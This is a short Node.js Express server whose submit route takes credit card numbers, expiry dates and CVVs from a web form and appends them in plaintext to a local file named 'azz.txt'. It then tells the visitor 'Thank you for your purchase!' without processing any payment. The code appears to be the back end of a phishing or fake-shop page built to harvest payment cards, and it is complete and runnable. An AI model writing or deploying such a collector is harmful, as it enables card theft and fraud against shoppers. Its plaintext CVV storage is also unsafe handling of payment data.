const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.static('public')); // Serve static files from the "public" directory
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/submit', (req, res) => {
    const { cardNumber, cardExpiry, cardCVV, product } = req.body;

    // Write the credit card info to a text file
    fs.appendFile('azz.txt', `Product: ${product}\nCard Number: ${cardNumber}\nExpiry Date: ${cardExpiry}\nCVV: ${cardCVV}\n\n`, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            res.status(500).send('Internal Server Error');
        } else {
            res.send('Thank you for your purchase!');
        }
    });
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
